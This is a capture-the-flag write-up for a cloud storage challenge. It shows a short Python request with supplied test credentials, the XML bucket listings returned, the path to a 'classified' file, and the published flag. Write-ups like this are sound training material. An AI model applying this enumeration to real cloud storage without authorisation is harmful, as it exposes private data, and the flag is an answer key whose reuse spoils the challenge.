## Trust Issues

<img src="chall.png" width=600>

### Challenge Description

```
KRAMPUS SYNDICATE managed to get one of their operatives hired as an external contractor at NPLD's cloud infrastructure team. They've been given minimal access, but NPLD's IAM policies are... not great.

Escalate your privileges and find the classified data.
    Endpoint: https://trust-issues.csd.lol
    Region: us-east-1
    Credentials: test / test
    Starting Role: npld-ext-2847

Note: Environment resets every 10 minutes.
```

### Writeup  

The challenge endpoint just gives a blank webpage if you visit it normally.  

We can first visit it by using the credentials provided.  

```python
import requests

url = "https://trust-issues.csd.lol/"

res = requests.get(url, headers={
    'Authorization': "AWS test:test"
})

print(res.text)
```

This time, the server will respond with an XML file, which lists some directories that we can visit.  

```xml
<?xml version='1.0' encoding='utf-8'?>
<ListAllMyBucketsResult>
	<Owner>
		<DisplayName>webfile</DisplayName>
		<ID>75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a</ID>
	</Owner>
	<Buckets>
		<Bucket>
			<Name>npld-backup-vault-7f3a</Name>
			<CreationDate>2025-12-19T23:52:17.000Z</CreationDate>
		</Bucket>
		<Bucket>
			<Name>npld-public-assets</Name>
			<CreationDate>2025-12-19T23:52:19.000Z</CreationDate>
		</Bucket>
		<Bucket>
			<Name>npld-logs-archive</Name>
			<CreationDate>2025-12-19T23:52:20.000Z</CreationDate>
		</Bucket>
		<Bucket>
			<Name>elf-hr-documents</Name>
			<CreationDate>2025-12-19T23:52:21.000Z</CreationDate>
		</Bucket>
	</Buckets>
</ListAllMyBucketsResult>
```

Visiting the first bucket `/npld-backup-vault-7f3a` will then reveal more files.  

```xml
<?xml version='1.0' encoding='utf-8'?>
<ListBucketResult>
	<IsTruncated>false</IsTruncated>
	<Marker />
	<Name>npld-backup-vault-7f3a</Name>
	<Prefix />
	<MaxKeys>1000</MaxKeys>
	<Contents>
		<Key>classified/wishlist-backup.txt</Key>
		<ETag>"73a783836a091b0ac2c62a19b71f5779"</ETag>
		<Owner>
			<DisplayName>webfile</DisplayName>
			<ID>75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a</ID>
		</Owner>
		<Size>53</Size>
		<LastModified>2025-12-19T23:52:22.000Z</LastModified>
		<StorageClass>STANDARD</StorageClass>
	</Contents>
	<Contents>
		<Key>readme.txt</Key>
		<ETag>"39676ea67ff91929bb66e15d0e4d2dae"</ETag>
		<Owner>
			<DisplayName>webfile</DisplayName>
			<ID>75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a</ID>
		</Owner>
		<Size>13</Size>
		<LastModified>2025-12-19T23:52:24.000Z</LastModified>
		<StorageClass>STANDARD</StorageClass>
	</Contents>
</ListBucketResult>
```

Visiting `/npld-backup-vault-7f3a/classified/wishlist-backup.txt` will then give the flag.  

Flag: `csd{sO_M4NY_VUln3R48L3_7H1Ngs_7H3S3_d4yS_s1gh_bc653}`